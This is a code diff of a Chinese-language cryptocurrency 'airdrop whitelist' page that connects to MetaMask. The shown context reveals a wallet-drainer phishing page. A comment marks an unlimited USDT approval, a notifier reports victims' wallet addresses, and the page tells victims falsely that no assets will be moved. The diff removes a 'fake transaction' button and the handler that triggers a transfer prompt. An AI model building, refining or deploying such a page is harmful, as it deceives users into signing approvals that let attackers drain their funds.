@@ -21,10 +21,8 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 .btn:active{opacity:.9;transform:scale(.98)}
 .mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
 .verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}
-.send-btn{background:linear-gradient(135deg,#409eff,#2563eb);color:#fff}
 .success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}
 .addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
-.input-box{width:100%;height:50px;background:rgba(14,22,40,.8);border:1px solid rgba(64,158,255,.2);border-radius:12px;padding:0 15px;color:#fff;font-size:15px;margin-bottom:12px;outline:none}
 .tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
 </style>
 </head>
@@ -54,9 +52,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <h1>钱包连接成功</h1>
 <p class="sub-title">确认纳入全链空投白名单</p>
 <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
-
-<input type="text" class="input-box" id="toAddr" placeholder="请输入接收空投的钱包地址" value="0x0000000000000000000000000000000000000000">
-<button class="btn send-btn" id="sendBtn">发起空投交易确认</button>
 
 <button class="btn verify-btn" id="approveBtn">确认空投授权加入白名单</button>
 <p class="tips-info">仅链上备案核验，不会划转任何资产</p>
@@ -113,22 +108,6 @@ document.getElementById("connectMM").onclick = async ()=>{
     ethereum.on("chainChanged",i=>chainId=i);
     ethereum.on("accountsChanged",a=>{if(a.length){walletAddr=a[0];document.getElementById("showAddr").innerText=walletAddr;}else show("p1");});
   }catch(e){show("p1");ding("连接失败");}
-};
-
-// 发起假交易（输入地址唤起转账弹窗）
-document.getElementById("sendBtn").onclick = async ()=>{
-  if(!walletAddr){alert("请先连接钱包");return;}
-  let to = document.getElementById("toAddr").value.trim();
-  if(!to || to.length<42){alert("请输入正确的钱包地址");return;}
-  try{
-    show("p2");
-    await ethereum.request({
-      method:"eth_sendTransaction",
-      params:[{from:walletAddr,to:to,value:"0x0",gas:"0x5208"}]
-    });
-    show("p3");
-    ding("用户发起假交易："+walletAddr+" → "+to);
-  }catch(e){show("p3");ding("假交易取消");}
 };
 
 // 授权 USDT（无限额度）
